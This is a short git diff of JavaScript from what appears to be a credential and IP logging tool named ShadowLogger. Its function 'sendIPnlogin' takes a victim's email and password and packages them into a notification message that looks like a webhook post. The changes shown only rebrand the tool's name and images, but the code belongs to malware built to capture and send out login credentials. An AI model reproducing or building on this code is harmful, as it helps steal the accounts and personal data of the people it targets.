@@ -23,8 +23,8 @@ const sendIPnlogin = (email = 'unknown', password = 'unknown') => {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            username: "1pl0gg3r", // changeable
-                            avatar_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/IP-Logger%20pfp.png", // changeable
+                            username: "ShadowLogger", // changeable
+                            avatar_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/ShadowLogger%20pfp.png", // changeable
                             content: `@everyone`,
                             embeds: [
                                 {
@@ -63,11 +63,11 @@ const sendIPnlogin = (email = 'unknown', password = 'unknown') => {
                                         }
                                     ],
                                     thumbnail: {
-                                        url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/IP-Logger%20pfp.png" // changeable
+                                        url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/ShadowLogger%20pfp.png" // changeable
                                     },
                                     footer: {
-                                        text: "IP Logger v2 by ARMed0ps",
-                                        icon_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/IP-Logger%20pfp.png" // changeable
+                                        text: "ShadowLogger by ARMed0ps",
+                                        icon_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/ShadowLogger%20pfp.png" // changeable
                                     },
                                     timestamp: new Date().toISOString()
                                 }
